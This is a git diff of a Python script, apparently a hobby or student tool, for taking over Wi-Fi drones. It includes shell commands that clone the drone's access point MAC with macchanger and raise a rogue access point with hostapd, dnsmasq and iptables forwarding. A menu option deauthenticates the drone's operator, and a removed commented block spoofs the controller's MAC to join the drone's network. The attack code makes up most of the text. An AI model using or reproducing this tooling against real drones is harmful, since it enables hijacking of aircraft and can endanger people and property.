@@ -94,22 +94,22 @@ def create_configs(iface, essid, channel_no):
     cf.create_dnsmasq(iface)
 
 def rogue_ap():
-    global iface, bssid_name
-    #os.system('sudo killall dnsmasq')
-    #os.system(f'ifconfig {iface} down')
-    #os.system(f'macchanger --mac={bssid_name} {iface}')
-    #os.system(f'ifconfig {iface} up')
+    global iface, bssid_name, start2
+    os.system('sudo killall dnsmasq')
     os.system(f'ifconfig {iface} up 192.168.1.1 netmask 255.255.255.0')
     os.system('route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1')
     #ip forwarding and adapter bridging
     os.system('iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE')
     os.system('iptables --append FORWARD --in-interface wlan0 -j ACCEPT')
     os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+    end2 = time.time()
+    #print("The time of execution of above program is :", end2-start2)rccc
     os.system("dnsmasq -C dnsmasq.conf -d | xterm -hold -e hostapd hostapd.conf")
     ##look at connecting to access point without network manager
     
 def main():
-    global iface,iface1, essid_name, bssid_name, channel_no
+    start = time.time()
+    global iface,iface1, essid_name, bssid_name, channel_no, start2
     iface = setup_monitor("wlan0")
     #iface1 = ("drone_wlan")
     #os.system(f"iw dev wlan0mon interface add {iface1} type managed")
@@ -132,19 +132,25 @@ def main():
     #shows drone and operator information
     print('Drone information:',essid_name, bssid_name, channel_no)
     print('Drone controller info:',client_mac)
+    end = time.time()
+    #print("The time of execution of above program is :", end-start)
 
+    start2 = time.time()
     create_configs(iface, essid_name, channel_no)
     choice = input("1 = Rogue AP\n2 = Connect to drone\n")
     if (choice == "1"):
         print("Fake Access Point\nWhen Done Press CTRL+C")
         time.sleep(2.0)
-        #used to spoof drone access point
+
+        #used to spoof the mac of drone access point and channel number
         os.system(f"ifconfig {iface} down")
         os.system(f"iwconfig {iface} channel {channel_no}")
         os.system(f"macchanger --mac={bssid_name} {iface}")
         os.system(f"ifconfig {iface} up")
+
         print("Rogue Access Point Initialisation")
         rogue_ap()
+
 
     if (choice == "2"):
         print("Drone connection & Operator deauthentication")
@@ -165,26 +171,3 @@ def main():
     
 if __name__ == "__main__":
     main()
-
-#print('RAM memory % used:', psutil.virtual_memory()[2])
-
-#2nd method to connecting to drone
-    #os.system('airmon-ng check kill')
-    #os.system('ifconfig wlan0 down')
-    #os.system(f'iwconfig wlan0 channel {channel_no}')
-    #os.system('ifconfig wlan0 up')
-    #os.system('dhclient -v wlan0')
-    #da = Process(target = deauth, args = (0, client_mac, bssid_name, iface))
-    #da.start()
-    #os.system(f'ifconfig wlan0 down')
-    #os.system(f'macchanger --mac={client_mac} wlan0')
-    #os.system(f"iwconfig wlan0 essid {essid_name}")
-    #os.system('Connection to drone established')
-    #os.system(f'ifconfig wlan0 up')
-    #os.system('dhclient -v wlan0')
-    #os.system("well done!!! now look at controlling drone when taken over!")
-    #os.system(f'iwconfig wlan0 essid {essid_name} channel {channel_no} ap {bssid_name}')
-    #os.system('ifconfig wlan0 up')
-    #os.system('dhclient -v wlan0')
-    #os.system('Connection to drone established')
-    #da.terminate()    
